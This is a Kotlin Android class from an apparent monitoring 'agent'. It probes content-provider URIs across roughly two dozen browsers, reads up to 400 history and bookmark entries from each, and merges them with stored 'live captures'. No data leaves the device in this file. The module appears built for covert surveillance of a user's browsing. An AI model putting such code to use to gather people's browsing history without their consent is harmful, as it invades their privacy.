package com.zenvora.agent.manager

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

/**
 * Collects history from the system browser provider (Android 5–6),
 * any browser that still exposes a bookmarks URI, plus live captures.
 */
class BrowserHistoryManager(private val context: Context) {

    private val iso = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    fun fetch(): JSONArray {
        BrowserHistoryStore.load(context)
        val merged = LinkedHashMap<String, JSONObject>()
        fun put(obj: JSONObject) {
            val key = obj.optString("browser") + "|" + obj.optString("url") + "|" + obj.optString("visitTime")
            merged[key] = obj
        }
        queryProviders().forEach { put(it) }
        val stored = BrowserHistoryStore.all()
        for (i in 0 until stored.length()) put(stored.getJSONObject(i))
        val out = JSONArray()
        merged.values.sortedByDescending { it.optString("visitTime") }.forEach { out.put(it) }
        return out
    }

    private fun queryProviders(): List<JSONObject> {
        val found = mutableListOf<JSONObject>()
        val uris = mutableListOf(
            "content://browser/bookmarks",
            "content://browser/searches",
            "content://com.android.browser/bookmarks",
            "content://com.android.browser/history",
            "content://com.android.chrome.browser/bookmarks",
            "content://com.sec.android.app.sbrowser.browser/bookmarks",
            "content://com.opera.browser.browser/bookmarks",
            "content://org.mozilla.firefox.db.browser/bookmarks"
        )
        (KNOWN_PACKAGES + installedBrowsers()).distinct().forEach { pkg ->
            uris.add("content://$pkg.browser/bookmarks")
            uris.add("content://$pkg.provider/bookmarks")
            uris.add("content://$pkg.browser/history")
        }
        uris.distinct().forEach { raw ->
            found.addAll(queryUri(Uri.parse(raw), browserNameForUri(raw)))
        }
        return found
    }

    private fun queryUri(uri: Uri, browser: String): List<JSONObject> {
        val out = mutableListOf<JSONObject>()
        val cursor = try {
            context.contentResolver.query(uri, null, null, null, null)
        } catch (_: Exception) {
            null
        } ?: return out
        cursor.use {
            val urlIdx = column(it, "url", "URL")
            if (urlIdx < 0) return out
            val titleIdx = column(it, "title", "TITLE")
            val dateIdx = column(it, "date", "DATE", "created", "CREATED", "visits_date")
            val visitsIdx = column(it, "visits", "VISITS", "visit_count")
            var n = 0
            while (it.moveToNext() && n < 400) {
                val url = it.getString(urlIdx) ?: continue
                if (!url.startsWith("http")) continue
                val whenMs = if (dateIdx >= 0) it.getLong(dateIdx) else System.currentTimeMillis()
                out.add(
                    JSONObject()
                        .put("browser", browser)
                        .put("url", url)
                        .put("title", if (titleIdx >= 0) it.getString(titleIdx) ?: url else url)
                        .put("visitTime", iso.format(Date(if (whenMs in 1 until 1_000_000_000_000L) whenMs * 1000 else whenMs)))
                        .put("visitCount", if (visitsIdx >= 0) it.getInt(visitsIdx) else 1)
                        .put("windowsUser", "android")
                        .put("browserProfile", browser)
                )
                n++
            }
        }
        return out
    }

    private fun column(cursor: android.database.Cursor, vararg names: String): Int {
        for (name in names) {
            val idx = cursor.getColumnIndex(name)
            if (idx >= 0) return idx
        }
        return -1
    }

    fun installedBrowsers(): List<String> {
        val pm = context.packageManager
        val intent = Intent(Intent.ACTION_VIEW, Uri.parse("http://example.com"))
        val resolved = try {
            if (Build.VERSION.SDK_INT >= 33) {
                pm.queryIntentActivities(intent, PackageManager.ResolveInfoFlags.of(0))
            } else {
                @Suppress("DEPRECATION")
                pm.queryIntentActivities(intent, 0)
            }.map { it.activityInfo.packageName }
        } catch (_: Exception) {
            emptyList()
        }
        return (KNOWN_PACKAGES.filter { installed(it) } + resolved).distinct()
    }

    private fun installed(pkg: String): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= 33) {
                context.packageManager.getPackageInfo(pkg, PackageManager.PackageInfoFlags.of(0))
            } else {
                @Suppress("DEPRECATION")
                context.packageManager.getPackageInfo(pkg, 0)
            }
            true
        } catch (_: Exception) {
            false
        }
    }

    private fun browserNameForUri(uri: String): String {
        val u = uri.lowercase(Locale.US)
        return when {
            u.contains("chrome") || u.contains("kiwi") -> "Chrome"
            u.contains("firefox") || u.contains("mozilla") -> "Firefox"
            u.contains("sbrowser") || u.contains("samsung") -> "Samsung"
            u.contains("opera") -> "Opera"
            u.contains("brave") -> "Brave"
            u.contains("emmx") || u.contains("edge") -> "Edge"
            u.contains("duckduckgo") -> "DuckDuckGo"
            u.contains("yandex") -> "Yandex"
            else -> "Browser"
        }
    }

    companion object {
        val KNOWN_PACKAGES = listOf(
            "com.android.chrome",
            "com.chrome.beta",
            "com.chrome.dev",
            "com.chrome.canary",
            "org.mozilla.firefox",
            "org.mozilla.firefox_beta",
            "org.mozilla.focus",
            "com.sec.android.app.sbrowser",
            "com.opera.browser",
            "com.opera.mini.native",
            "com.brave.browser",
            "com.microsoft.emmx",
            "com.duckduckgo.mobile.android",
            "com.vivaldi.browser",
            "com.UCMobile",
            "com.uc.browser.en",
            "com.kiwibrowser.browser",
            "com.huawei.browser",
            "com.mi.globalbrowser",
            "com.android.browser",
            "com.heytap.browser",
            "com.coloros.browser",
            "com.vivo.browser",
            "com.yandex.browser",
            "com.ecosia.android",
            "mark.via.gp"
        )
    }
}
